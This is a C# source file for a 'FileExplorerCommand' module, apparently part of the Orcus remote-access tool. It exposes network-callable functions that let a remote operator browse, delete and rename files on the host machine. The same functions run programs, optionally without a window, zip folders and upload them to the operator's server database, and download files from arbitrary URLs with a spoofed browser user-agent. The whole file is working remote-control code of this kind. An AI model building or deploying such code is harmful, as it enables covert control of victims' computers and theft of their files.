using Orcus.Native;
using Orcus.Native.Shell;
using Orcus.Plugins;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.Utilities;
using Orcus.Utilities;
using ShellLibrary;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using ICSharpCode.SharpZipLib.Zip;
using Orcus.Shared.NetSerializer;
using FileAttributes = Orcus.Shared.Commands.FileExplorer.FileAttributes;

namespace Orcus.Commands.FileExplorer
{
    [DisallowMultipleThreads]
    public class FileExplorerCommand : Command
    {
        private readonly List<Guid> _canceledDownloads;

        private static readonly Dictionary<string, List<ProcessingEntry>> ProcessingEntries =
            new Dictionary<string, List<ProcessingEntry>>();

        private static readonly Dictionary<string, CancellationTokenEx> ProcessEntryCancellationTokens =
            new Dictionary<string, CancellationTokenEx>();

        private static readonly object ProcessingEntriesLock = new object();
        private static event EventHandler<ProcessingEntriesChangedEventArgs> ProcessingEntriesChanged;

        private readonly DtpProcessor _dtpProcessor;
        private readonly UploadService _uploadService;
        private IConnectionInfo _connectionInfo;
        private bool _isDisposed;

        private readonly Lazy<Serializer> _processingEntryUpdateSerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(ProcessingEntryUpdate)));

        private readonly Lazy<Serializer> _processingEntrySerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(ProcessingEntry)));

        public FileExplorerCommand()
        {
            _uploadService = new UploadService();
            _canceledDownloads = new List<Guid>();
            ProcessingEntriesChanged += OnProcessingEntriesChanged;

            _dtpProcessor = new DtpProcessor();
            _dtpProcessor.RegisterFunction("GetRootElements", parameters =>
                {
                    var rootEntryCollection = new RootEntryCollection
                    {
                        RootDirectories = DirectoryHelper.GetNamespaceDirectories(),
                        ComputerDirectory = DirectoryHelper.GetDirectoryEntry(DirectoryInfoEx.MyComputerDirectory, null),
                        ComputerDirectoryEntries = DirectoryHelper.GetComputerDirectoryEntries()
                    };

                    foreach (var driveInfo in DriveInfo.GetDrives())
                    {
                        if (
                            rootEntryCollection.ComputerDirectoryEntries.All(
                                x => x.Path != driveInfo.RootDirectory.FullName))
                        {
                            rootEntryCollection.ComputerDirectoryEntries.Add(
                                DirectoryHelper.GetDirectoryEntry(
                                    new DirectoryInfoEx(driveInfo.RootDirectory.FullName), null));
                        }
                    }
                    return rootEntryCollection;
                }, typeof(RootEntryCollection), typeof(FileEntry), typeof(DirectoryEntry), typeof(DriveDirectoryEntry),
                typeof(ProcessingEntry));
            _dtpProcessor.RegisterFunction("GetDirectories", parameters =>
            {
                var path = parameters.GetString(0);
                var entries =
                    DirectoryHelper.GetDirectories(new DirectoryInfoEx(path));
                return entries;
            }, typeof(DriveDirectoryEntry));
            _dtpProcessor.RegisterFunction("GetPathContent", parameters =>
            {
                var directories = parameters.GetValue<List<string>>(0);
                var requestFirstAllEntries = parameters.GetBool(1);
                var result = new List<List<IFileExplorerEntry>>();

                for (int i = 0; i < directories.Count; i++)
                {
                    var directory = directories[i];
                    if (i == 0 && requestFirstAllEntries)
                    {
                        var list = DirectoryHelper.GetDirectoryEntries(directory);
                        result.Add(list);
                        lock (ProcessingEntriesLock)
                        {
                            if (ProcessingEntries.TryGetValue(directory.NormalizePath(), out var processingEntries))
                            {
                                foreach (var fileExplorerEntry in processingEntries.Cast<IFileExplorerEntry>())
                                {
                                    var existingEntry = list.FirstOrDefault(x => x.Name.Equals(fileExplorerEntry.Name, StringComparison.OrdinalIgnoreCase));
                                    if (existingEntry != null)
                                        list.Remove(existingEntry);
                                    list.Add(fileExplorerEntry);
                                }
                            }
                        }
                    }
                    else
                    {
                        if (directory.Length > 3)
                        {
                            try
                            {
                                result.Add(DirectoryHelper.GetDirectoriesFast(directory).Cast<IFileExplorerEntry>()
                                    .ToList());
                                continue;
                            }
                            catch (Exception)
                            {
                                // ignored
                            }
                        }

                        result.Add(
                            DirectoryHelper.GetDirectories(new DirectoryInfoEx(directory))
                                .Cast<IFileExplorerEntry>()
                                .ToList());
                    }
                }

                return result;
            }, typeof(PackedDirectoryEntry), typeof(DriveDirectoryEntry), typeof(FileEntry), typeof(ProcessingEntry));
            _dtpProcessor.RegisterFunction("GetDirectory", parameters =>
            {
                var path = parameters.GetString(0);
                return DirectoryHelper.GetDirectoryEntry(new DirectoryInfoEx(path), null);
            }, typeof(DriveDirectoryEntry));
            _dtpProcessor.RegisterFunction("ExpandEnvironmentVariables",
                parameters => Environment.ExpandEnvironmentVariables(parameters.GetString(0)));
            _dtpProcessor.RegisterFunction("RemoveEntries", parameters =>
            {
                var entries = parameters.GetValue<List<EntryInfo>>(0);
                var failedList = new List<string>();
                foreach (EntryInfo entry in entries)
                {
                    try
                    {
                        if (entry.IsDirectory)
                            Directory.Delete(entry.Path, true);
                        else
                            File.Delete(entry.Path);
                        failedList.Add(null);
                    }
                    catch (Exception ex)
                    {
                        failedList.Add(ex.Message);
                    }
                }

                return failedList;
            });
            _dtpProcessor.RegisterProcedure("RenameEntry", parameters =>
            {
                var entry = parameters.GetValue<EntryInfo>(0);
                var newName = parameters.GetString(1);
                if (entry.IsDirectory)
                    Directory.Move(entry.Path, Path.Combine(Path.GetDirectoryName(entry.Path), newName));
                else
                    File.Move(entry.Path, Path.Combine(Path.GetDirectoryName(entry.Path), newName));
            });
            _dtpProcessor.RegisterProcedure("CreateFolder", parameters =>
            {
                var path = parameters.GetString(0);
                Directory.CreateDirectory(path);
            });
            _dtpProcessor.RegisterProcedure("CreateShortcut", parameters =>
            {
                var path = parameters.GetString(0);
                var info = parameters.GetValue<ShortcutInfo>(1);

                Type t = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
                    //Windows Script Host Shell Object
                object shell = Activator.CreateInstance(t);
                try
                {
                    object lnk = t.InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, shell,
                        new object[] {path});
                    try
                    {
                        t.InvokeMember("TargetPath", BindingFlags.SetProperty, null, lnk,
                            new object[] {info.TargetLocation});
                        t.InvokeMember("Description", BindingFlags.SetProperty, null, lnk,
                            new object[] {info.Description});

                        if (!string.IsNullOrEmpty(info.WorkingDirectory))
                            t.InvokeMember("WorkingDirectory", BindingFlags.SetProperty, null, lnk,
                                new object[] {info.WorkingDirectory});

                        if (!string.IsNullOrEmpty(info.IconPath))
                            t.InvokeMember("IconLocation", BindingFlags.SetProperty, null, lnk,
                                new object[] {$"{info.IconPath}, {info.IconIndex}"});

                        if (info.Hotkey != 0)
                        {
                            //FML
                            var keyByte = (byte) (info.Hotkey);
                            var modifierByte = (byte) (info.Hotkey >> 8);
                            var key = (Keys) keyByte;
                            var keys = new List<string>();

                            const byte HOTKEYF_SHIFT = 0x01;
                            const byte HOTKEYF_CONTROL = 0x02;
                            const byte HOTKEYF_ALT = 0x04;

                            if ((modifierByte & HOTKEYF_ALT) == HOTKEYF_ALT)
                                keys.Add("ALT");
                            if ((modifierByte & HOTKEYF_CONTROL) == HOTKEYF_CONTROL)
                                keys.Add("CTRL");
                            if ((modifierByte & HOTKEYF_SHIFT) == HOTKEYF_SHIFT)
                                keys.Add("SHIFT");

                            keys.Add(key.ToString().ToUpper());

                            t.InvokeMember("Hotkey", BindingFlags.SetProperty, null, lnk,
                                new object[] {string.Join("+", keys.ToArray())});
                        }

                        t.InvokeMember("Save", BindingFlags.InvokeMethod, null, lnk, null);
                    }
                    finally
                    {
                        Marshal.FinalReleaseComObject(lnk);
                    }
                }
                finally
                {
                    Marshal.FinalReleaseComObject(shell);
                }
            });
            _dtpProcessor.RegisterFunction("GetDirectoryProperties", parameters =>
            {
                var result = new DirectoryPropertiesInfo();
                var directoryInfo = new DirectoryInfoEx(parameters.GetString(0));
                if (directoryInfo.KnownFolderType != null)
                {
                    result.DirectoryType = DirectoryType.SpecialFolder;
                    result.SpecialFolderType = (SpecialFolderType) directoryInfo.KnownFolderType.Category;
                }
                var drive = DriveInfo.GetDrives()
                    .FirstOrDefault(x => x.RootDirectory.FullName == directoryInfo.FullName);
                if (drive != null)
                {
                    result.DirectoryType = DirectoryType.Drive;
                    if (drive.IsReady)
                        result.DriveFormat = drive.DriveFormat;
                    else
                        result.DriveFormat = "Not ready";
                }

                result.CreationTime = directoryInfo.CreationTimeUtc;
                result.LastAccessTime = directoryInfo.LastAccessTimeUtc;
                result.LastWriteTime = directoryInfo.LastWriteTimeUtc;
                result.Attributes = (FileAttributes) directoryInfo.Attributes;

                return result;
            });
            _dtpProcessor.RegisterFunction("GetFileProperties", parameters =>
            {
                var result = new FilePropertiesInfo();
                var fileInfo = new FileInfoEx(parameters.GetString(0));
                try
                {
                    result.OpenWithProgramPath = FileHelper.AssocQueryString(AssocStr.Executable,
                        fileInfo.Extension);
                    result.OpenWithProgramName = FileHelper.AssocQueryString(AssocStr.FriendlyAppName,
                        fileInfo.Extension);
                }
                catch (Exception)
                {
                    // ignored
                }
                try
                {
                    result.SizeOnDisk = FileHelper.GetFileSizeOnDisk(fileInfo.FullName);
                }
                catch (Exception)
                {
                    // ignored
                }

                result.Size = fileInfo.Length;
                result.CreationTime = fileInfo.CreationTimeUtc;
                result.LastAccessTime = fileInfo.LastAccessTimeUtc;
                result.LastWriteTime = fileInfo.LastWriteTimeUtc;
                result.Attributes = (FileAttributes) fileInfo.Attributes;

                result.FileProperties = new List<FileProperty>();

                try
                {
                    var fileShellObject = ShellObject.FromParsingName(fileInfo.FullName);

                    if (fileShellObject != null)
                    {
                        using (fileShellObject)
                        {
                            foreach (var prop in fileShellObject.Properties.DefaultPropertyCollection)
                            {
                                if (string.IsNullOrEmpty(prop.CanonicalName))
                                    continue;

                                var valueString = ObjectToString(prop.ValueAsObject);
                                if (string.IsNullOrEmpty(valueString))
                                    continue;

                                var shellProperty = new ShellProperty
                                {
                                    Name = prop.CanonicalName,
                                    FormatId = prop.PropertyKey.FormatId,
                                    PropertyId = prop.PropertyKey.PropertyId,
                                    Value = valueString
                                };

                                var propertyNameSplitter = prop.CanonicalName.Split('.');
                                if (propertyNameSplitter.Length < 3)
                                    shellProperty.Group = FilePropertyGroup.Details;
                                else
                                {
                                    try
                                    {
                                        shellProperty.Group =
                                            (FilePropertyGroup)
                                            Enum.Parse(typeof(FilePropertyGroup), propertyNameSplitter[1]);
                                    }
                                    catch (Exception)
                                    {
                                        shellProperty.Group = FilePropertyGroup.Details;
                                    }
                                }

                                result.FileProperties.Add(shellProperty);
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    // ignored
                }

                try
                {
                    var fileVersionInfo =
                        FileVersionInfo.GetVersionInfo(fileInfo.FullName);

                    foreach (var prop in typeof(FileVersionInfo).GetProperties())
                    {
                        var value = prop.GetValue(fileVersionInfo, null);

                        if (value == null)
                            continue;

                        if (prop.PropertyType == typeof(string) && string.IsNullOrEmpty((string) value))
                            continue;

                        if (prop.Name.EndsWith("Part"))
                            continue;

                        if (prop.PropertyType == typeof(bool) && !(bool) value)
                            continue;

                        string valueString;
                        if (value is DateTime)
                            valueString = ((DateTime) value).ToUniversalTime().ToString(CultureInfo.InvariantCulture);
                        else
                            valueString = value.ToString();

                        if (result.FileProperties.Any(x => x.Value == valueString))
                            continue;

                        result.FileProperties.Add(new FileProperty
                        {
                            Name = prop.Name,
                            Value = valueString,
                            Group = FilePropertyGroup.FileVersionInfo
                        });
                    }
                }
                catch (Exception)
                {
                    // ignored
                }

                var executableExtensions = new[] {".exe", ".scr", ".com"};

                if (
                    executableExtensions.Any(
                        x => string.Equals(x, fileInfo.Extension, StringComparison.OrdinalIgnoreCase)))
                {
                    try
                    {
                        var assemblyName = AssemblyName.GetAssemblyName(fileInfo.FullName).FullName;
                        result.FileProperties.Add(new FileProperty
                        {
                            Name = "AssemblyName",
                            Value = assemblyName,
                            Group = FilePropertyGroup.Executable
                        });
                        result.FileProperties.Add(new FileProperty
                        {
                            Name = "IsAssembly",
                            Value = "True",
                            Group = FilePropertyGroup.Executable
                        });
                    }
                    catch (Exception)
                    {
                        // ignored
                    }

                    try
                    {
                        result.FileProperties.Add(new FileProperty
                        {
                            Name = "IsTrusted",
                            Value = AuthenticodeTools.IsTrusted(fileInfo.FullName).ToString(),
                            Group = FilePropertyGroup.Executable
                        });
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                return result;
            }, typeof(ShellProperty));
            _dtpProcessor.RegisterFunction("CalculateHashValue", parameters =>
            {
                var path = parameters.GetString(0);
                var type = parameters.GetValue<HashValueType>(1);

                HashAlgorithm hashAlgorithm;
                switch (type)
                {
                    case HashValueType.MD5:
                        hashAlgorithm = new MD5CryptoServiceProvider();
                        break;
                    case HashValueType.SHA1:
                        hashAlgorithm = new SHA1CryptoServiceProvider();
                        break;
                    case HashValueType.SHA256:
                        hashAlgorithm = new SHA256CryptoServiceProvider();
                        break;
                    case HashValueType.SHA512:
                        hashAlgorithm = new SHA512CryptoServiceProvider();
                        break;
                    default:
                        throw new ArgumentOutOfRangeException();
                }

                using (hashAlgorithm)
                using (var fileStream = new FileStream(path, FileMode.Open, FileAccess.Read))
                    return hashAlgorithm.ComputeHash(fileStream);
            });
            _dtpProcessor.RegisterProcedure("ExecuteFile", parameters =>
            {
                var path = parameters.GetString(0);
                var arguments = parameters.GetString(1);
                var verb = parameters.GetString(2);
                var createNoWindow = parameters.GetBool(3);

                var process = new Process
                {
                    StartInfo =
                    {
                        FileName = path,
                        Arguments = arguments,
                        Verb = verb,
                        CreateNoWindow = createNoWindow
                    }
                };
                process.Start();
            });
            _dtpProcessor.RegisterFunction("RequestFileUpload", parameters =>
            {
                var path = parameters.GetString(0);
                var hashValue = parameters.GetValue<byte[]>(1);
                var length = parameters.GetValue<long>(2);

                return _uploadService.CreateNewUploadProcess(path, hashValue, length);
            });
            _dtpProcessor.RegisterProcedure("CancelFileUpload", parameters =>
            {
                var guid = parameters.GetValue<Guid>(0);
                _uploadService.CancelUpload(guid);
            });
            _dtpProcessor.RegisterFunction("FinishFileUpload", parameters =>
            {
                var guid = parameters.GetValue<Guid>(0);
                return _uploadService.FinishUpload(guid);
            });
            _dtpProcessor.RegisterFunction("InitializeDownload", parameters =>
            {
                var path = parameters.GetString(0);
                var isDirectory = parameters.GetBool(1);
                var guid = parameters.GetValue<Guid>(2);

                FileInfo fileToUpload;
                if (isDirectory)
                {
                    var directory = new DirectoryInfo(path);
                    if (!directory.Exists)
                        return new DownloadInformation(DownloadResult.DirectoryNotFound);

                    fileToUpload = new FileInfo(FileExtensions.GetFreeTempFileName());
                    ResponseByte((byte) FileExplorerCommunication.ResponsePackagingDirectory, _connectionInfo);
                    var fastZip = new FastZip();
                    fastZip.CreateZip(fileToUpload.FullName, directory.FullName, true, null, null);
                }
                else
                {
                    var fi = new FileInfo(path);
                    if (!fi.Exists)
                        return new DownloadInformation(DownloadResult.FileNotFound);

                    fileToUpload = fi.CopyTo(FileExtensions.GetFreeTempFileName());

                    ResponseByte((byte) FileExplorerCommunication.ResponseCopyingFile, _connectionInfo);
                }

                var fileStream = new FileStream(fileToUpload.FullName, FileMode.Open, FileAccess.Read);
                byte[] hash;
                using (var md5CryptoService = new MD5CryptoServiceProvider())
                    hash = md5CryptoService.ComputeHash(fileStream);

                fileStream.Position = 0;
                new Thread(() =>
                {
                    const int bufferSize = 4096;
                    try
                    {
                        using (fileStream)
                        {
                            int read;
                            var guidData = guid.ToByteArray();
                            var buffer = new byte[bufferSize];

                            while ((read = fileStream.Read(buffer, 0, bufferSize)) > 0)
                            {
                                _connectionInfo.UnsafeResponse(this, read + 17, writer =>
                                {
                                    writer.Write((byte) FileExplorerCommunication.ResponseDownloadPackage);
                                    writer.Write(guidData);
                                    writer.Write(buffer, 0, read);
                                });

                                if (_isDisposed)
                                    return;

                                if (_canceledDownloads.Contains(guid))
                                {
                                    _canceledDownloads.Remove(guid);
                                    return;
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        if (!_isDisposed)
                            ResponseBytes((byte) FileExplorerCommunication.ResponseDownloadFailed,
                                guid.ToByteArray(), _connectionInfo);
                    }
                    finally
                    {
                        fileToUpload.Delete();
                    }
                }).Start();

                return new DownloadInformation(fileToUpload.Length, hash);
            });
            _dtpProcessor.RegisterProcedure("CancelDownload", parameters =>
            {
                var downloadGuid = parameters.GetValue<Guid>(0);
                _canceledDownloads.Add(downloadGuid);
            });
            _dtpProcessor.RegisterFunction("DownloadToServer", parameters =>
            {
                var path = parameters.GetString(0);
                var isDirectory = parameters.GetBool(1);

                if (!isDirectory)
                {
                    var fileInfo = new FileInfo(path);
                    if (!fileInfo.Exists)
                        return DownloadResult.FileNotFound;

                    new Thread(() =>
                    {
                        _connectionInfo.ClientInfo.ClientOperator.DatabaseConnection.PushFile(fileInfo.FullName,
                            fileInfo.Name, DataMode.File);
                    }).Start();
                }
                else
                {
                    var directoryInfo = new DirectoryInfo(path);
                    if (!directoryInfo.Exists)
                        return DownloadResult.DirectoryNotFound;

                    new Thread(() =>
                    {
                        var tempFile = new FileInfo(FileExtensions.GetFreeTempFileName());
                        var fastZip = new FastZip();
                        fastZip.CreateZip(tempFile.FullName, directoryInfo.FullName, true, null);

                        _connectionInfo.ClientInfo.ClientOperator.DatabaseConnection.PushFile(tempFile.FullName,
                            directoryInfo.Name, DataMode.ZipArchive);
                        tempFile.Delete();
                    }).Start();
                }

                return DownloadResult.Succeed;
            });
            _dtpProcessor.RegisterFunction("GetFileThumbnail", parameters =>
            {
                var filePath = parameters.GetString(0);
                var bigSize = parameters.GetBool(1);

                var thumbnail = bigSize
                    ? WindowsThumbnailProvider.GetThumbnail(filePath, 300, 169, ThumbnailOptions.BiggerSizeOk)
                    : WindowsThumbnailProvider.GetThumbnail(filePath, 100, 56, ThumbnailOptions.None);

                byte[] data;
                using (var memoryStream = new MemoryStream())
                {
                    thumbnail.Save(memoryStream, ImageFormat.Png);
                    data = memoryStream.ToArray();
                }
                Debug.Print("Thumbnail size: " + data.Length);

                return data;
            });
            _dtpProcessor.RegisterProcedure("CreateArchive", parameters =>
            {
                var archiveOptions = parameters.GetValue<ArchiveOptions>(0);
                var processingEntry = new ProcessingEntry
                {
                    Action = ProcessingEntryAction.Packing,
                    CreationTime = DateTime.UtcNow,
                    IsInterminate = true,
                    LastAccess = DateTime.UtcNow,
                    Name = Path.GetFileName(archiveOptions.ArchivePath),
                    Path = archiveOptions.ArchivePath,
                    Size = 0,
                    Progress = 0
                };

                var normalizedFolderPath = Path.GetDirectoryName(archiveOptions.ArchivePath).NormalizePath();
                var normalizedPath = archiveOptions.ArchivePath.NormalizePath();

                var cancellationToken = new CancellationTokenEx();
                
                lock (ProcessingEntriesLock)
                {
                    if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var processingEntries))
                        processingEntries.Add(processingEntry);
                    else
                        ProcessingEntries.Add(normalizedFolderPath, new List<ProcessingEntry> {processingEntry});

                    ProcessEntryCancellationTokens.Add(normalizedPath, cancellationToken);
                }

                ProcessingEntriesChanged?.Invoke(this,
                    new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry, EntryUpdateMode.Add));

                new Thread(() =>
                {
                    try
                    {
                        ZipUtilities.CreateArchive(archiveOptions, processingEntry, cancellationToken, entry =>
                        {
                            ProcessingEntriesChanged?.Invoke(this,
                                new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry,
                                    EntryUpdateMode.Update));
                        });
                    }
                    catch (Exception)
                    {
                        cancellationToken.Cancel();
                    }
                    finally
                    {
                        lock (ProcessingEntriesLock)
                        {
                            if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var processingEntries))
                            {
                                processingEntries.Remove(processingEntry);
                                if (processingEntries.Count == 0)
                                    ProcessingEntries.Remove(normalizedFolderPath);
                            }

                            ProcessEntryCancellationTokens.Remove(normalizedPath);
                        }
                    }

                    if (cancellationToken.IsCanceled)
                    {
                        try
                        {
                            File.Delete(archiveOptions.ArchivePath);
                        }
                        catch (Exception)
                        {
                            // ignored
                        }

                        return;
                    }

                    if (archiveOptions.DeleteAfterArchiving)
                    {
                        foreach (var entry in archiveOptions.Entries)
                        {
                            try
                            {
                                if (entry.IsDirectory)
                                    Directory.Delete(entry.Path, true);
                                else
                                    File.Delete(entry.Path);
                            }
                            catch (Exception)
                            {
                                // ignored
                            }
                        }
                    }

                }).Start();
            });
            _dtpProcessor.RegisterProcedure("DownloadFileFromUrl", parameters =>
            {
                var path = parameters.GetString(0);
                var downloadUrl = new Uri(parameters.GetString(1));

                var processingEntry = new ProcessingEntry
                {
                    Action = ProcessingEntryAction.Downloading,
                    CreationTime = DateTime.UtcNow,
                    IsInterminate = false,
                    LastAccess = DateTime.UtcNow,
                    Name = Path.GetFileName(path),
                    Path = path,
                    Size = 0,
                    Progress = 0
                };

                var normalizedFolderPath = Path.GetDirectoryName(path).NormalizePath();
                var normalizedPath = path.NormalizePath();

                var webClient = new WebClient();
                webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

                var cancellationToken = new CancellationTokenEx(() => webClient.CancelAsync());

                lock (ProcessingEntriesLock)
                {
                    if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var processingEntries))
                        processingEntries.Add(processingEntry);
                    else
                        ProcessingEntries.Add(normalizedFolderPath, new List<ProcessingEntry> { processingEntry });

                    ProcessEntryCancellationTokens.Add(normalizedPath, cancellationToken);
                }

                ProcessingEntriesChanged?.Invoke(this,
                    new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry, EntryUpdateMode.Add));

                var stopwatch = Stopwatch.StartNew();
                webClient.DownloadProgressChanged += (sender, args) =>
                {
                    if (stopwatch.ElapsedMilliseconds > 1000)
                    {
                        stopwatch.Reset();
                        processingEntry.Size = args.BytesReceived;
                        processingEntry.Progress = args.ProgressPercentage / 100f;

                        ProcessingEntriesChanged?.Invoke(this,
                            new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry, EntryUpdateMode.Update));
                        stopwatch.Start();
                    }
                };
                webClient.DownloadFileCompleted += (sender, args) =>
                {
                    if (args.Cancelled || args.Error != null)
                    {
                        processingEntry.Size = 0;
                        processingEntry.Progress = -1;
                    }
                    else
                    {
                        processingEntry.Progress = 1;
                    }

                    ProcessingEntriesChanged?.Invoke(this,
                        new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry,
                            EntryUpdateMode.Update));

                    lock (ProcessingEntriesLock)
                    {
                        if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var processingEntries))
                        {
                            processingEntries.Remove(processingEntry);
                            if (processingEntries.Count == 0)
                                ProcessingEntries.Remove(normalizedFolderPath);
                        }

                        ProcessEntryCancellationTokens.Remove(normalizedPath);
                    }
                };
                webClient.DownloadFileAsync(downloadUrl, path);
            });
            _dtpProcessor.RegisterProcedure("CancelProcessingEntry", parameters =>
            {
                var path = parameters.GetString(0).NormalizePath();
                lock (ProcessingEntriesLock)
                {
                    if (ProcessEntryCancellationTokens.TryGetValue(path, out var cancellationToken))
                        cancellationToken.Cancel();
                }
            });
            _dtpProcessor.RegisterProcedure("ExtractArchive", parameters =>
            {
                var filePath = parameters.GetString(0);
                var destinationDirectory = parameters.GetString(1);
                var cancellationToken = new CancellationTokenEx();
                var addedEntries = new List<ProcessingEntry>();

                void RemoveProcessingEntry(ProcessingEntry processingEntry)
                {
                    var normalizedFolderPath = Path.GetDirectoryName(processingEntry.Path).NormalizePath();
                    var normalizedPath = processingEntry.Path.NormalizePath();

                    lock (ProcessingEntriesLock)
                    {
                        if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var processingEntries))
                        {
                            processingEntries.Remove(processingEntry);
                            if (processingEntries.Count == 0)
                                ProcessingEntries.Remove(normalizedFolderPath);
                        }

                        ProcessEntryCancellationTokens.Remove(normalizedPath);
                    }
                }

                new Thread(() =>
                {
                    try
                    {
                        ZipUtilities.ExtractArchive(filePath, destinationDirectory, cancellationToken, entry =>
                            {
                                ProcessingEntriesChanged?.Invoke(this,
                                    new ProcessingEntriesChangedEventArgs(
                                        Path.GetDirectoryName(entry.Path).NormalizePath(), entry,
                                        EntryUpdateMode.Update));

                                if (entry.Progress == 1 || entry.Progress == -1)
                                {
                                    RemoveProcessingEntry(entry);
                                    addedEntries.Remove(entry);
                                }
                            },
                            entry =>
                            {
                                var normalizedFolderPath = Path.GetDirectoryName(entry.Path).NormalizePath();
                                var normalizedPath = entry.Path.NormalizePath();

                                lock (ProcessingEntriesLock)
                                {
                                    if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var processingEntries))
                                        processingEntries.Add(entry);
                                    else
                                        ProcessingEntries.Add(normalizedFolderPath, new List<ProcessingEntry> {entry});

                                    ProcessEntryCancellationTokens.Add(normalizedPath, cancellationToken);
                                }

                                addedEntries.Add(entry);

                                ProcessingEntriesChanged?.Invoke(this,
                                    new ProcessingEntriesChangedEventArgs(normalizedFolderPath, entry,
                                        EntryUpdateMode.Add));
                            });
                    }
                    catch (Exception)
                    {
                        return;
                    }
                    finally
                    {
                        foreach (var processingEntry in addedEntries)
                        {
                            RemoveProcessingEntry(processingEntry);
                        }
                    }
                }).Start();
            });
        }

        private void OnProcessingEntriesChanged(object sender, ProcessingEntriesChangedEventArgs e)
        {
            if (_connectionInfo != null && !_isDisposed)
            {
                try
                {
                    switch (e.EntryUpdateMode)
                    {
                        case EntryUpdateMode.Add:
                            ResponseBytes((byte) FileExplorerCommunication.ResponseProcessingEntryAdded,
                                _processingEntrySerializer.Value.Serialize(e.ProcessingEntry), _connectionInfo);
                            break;
                        case EntryUpdateMode.Update:
                            var update = new ProcessingEntryUpdate
                            {
                                Path = e.ProcessingEntry.Path,
                                Progress = e.ProcessingEntry.Progress,
                                Size = e.ProcessingEntry.Size
                            };

                            ResponseBytes((byte) FileExplorerCommunication.ResponseProcessingEntryChanged,
                                _processingEntryUpdateSerializer.Value.Serialize(update), _connectionInfo);
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
                    }
                }
                catch (Exception)
                {
                    //connection info might be disposed
                }
            }
        }

        public override void Dispose()
        {
            base.Dispose();
            ProcessingEntriesChanged -= OnProcessingEntriesChanged;

            _isDisposed = true;
            _uploadService.Dispose();
        }

        private static string ObjectToString(object obj)
        {
            if (obj is ICollection)
                return string.Join(", ", ((ICollection) obj).Cast<object>().Select(x => x?.ToString()).ToArray());
            return obj?.ToString();
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((FileExplorerCommunication) parameter[0])
            {
                case FileExplorerCommunication.SendDtpPackage:
                    _connectionInfo = connectionInfo;
                    var response = _dtpProcessor.Receive(parameter, 1);
                    var responseData = new byte[response.Length + 1];
                    responseData[0] = (byte) FileExplorerCommunication.ResponseDtpPackage;
                    Array.Copy(response, 0, responseData, 1, response.Length);
                    connectionInfo.CommandResponse(this, responseData, PackageCompression.DoNotCompress);
                        //DTP does the compression
                    break;
                case FileExplorerCommunication.SendUploadPackage:
                    var guid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    _uploadService.ReceivePackage(guid, parameter, 17);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 7;
        }
    }
}